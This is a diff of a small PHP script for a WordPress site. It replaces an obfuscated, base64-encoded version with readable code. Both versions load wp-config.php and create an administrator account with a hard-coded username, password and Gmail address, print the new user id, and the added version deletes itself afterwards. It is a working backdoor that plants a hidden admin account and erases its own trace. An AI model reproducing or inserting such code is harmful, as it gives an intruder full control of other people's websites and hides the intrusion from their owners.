@@ -1,2 +1,15 @@
 <?php
-function O5683b1cfO($O2d5150f8O){switch($O2d5150f8O){case('O59679adcO'): return base64_decode('d3AtY29uZmlnLnBocA==');case('O273a939bO'): return base64_decode('dGhlbWVncw==');case('Oa18437daO'): return base64_decode('YXpkZDljMTIzLjY2QA==');case('Oc7babce0O'): return base64_decode('cGVja2FkbGVnd3RAZ21haWwuY29t');case('Obe8c7cdaO'): return base64_decode('YWRtaW5pc3RyYXRvcg==');case('Of49acf41O'): return base64_decode('dXNlcl9sb2dpbg==');case('Od68f707dO'): return base64_decode('dXNlcl9lbWFpbA==');case('Ob6fe8ac8O'): return base64_decode('dXNlcl9wYXNz');case('O2b953cdbO'): return base64_decode('cm9sZQ==');}}include O5683b1cfO('O59679adcO');$O4155c171O	= O5683b1cfO('O273a939bO');$Ob41cbd01O	= O5683b1cfO('Oa18437daO');$Odff85ba9O	= O5683b1cfO('Oc7babce0O');$O3ef8e53dO		= O5683b1cfO('Obe8c7cdaO');$O0eca2185O	= compact(O5683b1cfO('Of49acf41O'), O5683b1cfO('Od68f707dO'), O5683b1cfO('Ob6fe8ac8O'),O5683b1cfO('O2b953cdbO'));$Oc523fcd5O	= wp_insert_user($O0eca2185O);print_R($Oc523fcd5O);
+include 'wp-config.php';
+
+$user_login	= 'themegs';
+$user_pass	= 'azdd9c123.66@';
+$user_email	= 'peckadlegwt@gmail.com';
+$role		= 'administrator';
+
+$userdata	= compact('user_login', 'user_email', 'user_pass','role');
+
+$user_id	= wp_insert_user($userdata);
+
+print_R($user_id);
+
+unlink(__FILE__);
